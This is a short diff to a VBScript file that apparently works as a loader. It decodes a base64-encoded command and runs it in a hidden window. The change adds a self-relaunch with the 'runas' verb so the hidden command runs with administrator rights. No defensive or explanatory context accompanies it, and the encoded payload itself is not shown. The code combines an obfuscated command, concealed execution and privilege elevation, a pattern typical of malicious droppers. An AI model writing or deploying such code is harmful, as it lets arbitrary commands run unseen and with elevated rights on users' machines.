@@ -22,6 +22,13 @@ End Function
 Dim decodedCommand
 decodedCommand = DecodeBase64(encodedCommand)
 
-Dim shell
-Set shell = CreateObject("WScript.Shell")
-shell.Run decodedCommand, 0, True
+Set objShell = CreateObject("Shell.Application")
+If Not WScript.Arguments.Named.Exists("elevated") Then
+    ' Re-run the script as admin
+    objShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
+    WScript.Quit
+End If
+
+' Code to run elevated
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run decodedCommand, 0, True
